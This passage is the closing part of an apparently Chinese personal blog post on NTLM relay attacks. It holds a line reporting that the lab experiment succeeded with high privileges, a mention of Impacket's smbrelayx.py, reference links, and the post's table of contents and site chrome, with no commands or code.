+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/af425d19-e3e0-46f2-aa45-2b2c62805f16.png" alt="af425d19-e3e0-46f2-aa45-2b2c62805f16"></p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/7ceea99c-71f5-44c4-bcf4-e86b1b108004.png" alt="7ceea99c-71f5-44c4-bcf4-e86b1b108004"></p>
+<p>并且是高权限 实验完成  (Impacket中的smbrelayx.py也能做到)</p>
+<p><strong>参考</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/193493</span><br><span class="line">https://xz.aliyun.com/t/8562?time__1311=n4%2BxnD0DcDuD907DCiD%2Fje0%3DeitePvh4x4%2BWPhD</span><br><span class="line">https://www.freebuf.com/articles/network/244375.html</span><br><span class="line">https://blog.csdn.net/weixin_54902210/article/details/128340465</span><br></pre></td></tr></table></figure>
+
+
+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/16107.html" title="Hello World"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Hello World</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Sand4o</div><div class="author-info__description">卷不动辣</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://qm.qq.com/cgi-bin/qm/qr?k=yNiSH4ZQ2uBOCozNh3NZXNO15dOWwGnk" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">_(:ι」∠)_</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NTML-Relay%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">NTML-Relay前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFNTML%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.</span> <span class="toc-text">什么是NTML协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">NTLM认证过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-Hash%E5%92%8CNet-NTLM-Hash%E5%8C%BA%E5%88%AB"><span class="toc-number">1.3.</span> <span class="toc-text">NTLM Hash和Net-NTLM Hash区别</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NTML-Relay%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">NTML-Relay攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Net-NTLM-Relay%E7%9A%84%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">Net-NTLM Relay的攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Net-NTLM-Relay%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.</span> <span class="toc-text">Net-NTLM Relay攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">2.2.1.</span> <span class="toc-text">暴力破解明文密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.2.</span> <span class="toc-text">NTLM重放攻击</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/48087.html" title="NTLM-Relay攻击"><img src="https://api.vvhan.com/api/wallpaper/acg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NTLM-Relay攻击"/></a><div class="content"><a class="title" href="/posts/48087.html" title="NTLM-Relay攻击">NTLM-Relay攻击</a><time datetime="2024-06-25T06:23:06.456Z" title="发表于 2024-06-25 14:23:06">2024-06-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/16107.html" title="Hello World"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/posts/16107.html" title="Hello World">Hello World</a><time datetime="2024-06-09T14:05:38.767Z" title="发表于 2024-06-09 22:05:38">2024-06-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://api.vvhan.com/api/wallpaper/acg')"><div id="footer-wrap"><div class="copyright">&copy;2024 By Sand4o </div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi</div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="/js/jquery.js"></script><script src="/js/foot.js"></script><script src="/js/jiazaitiao.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
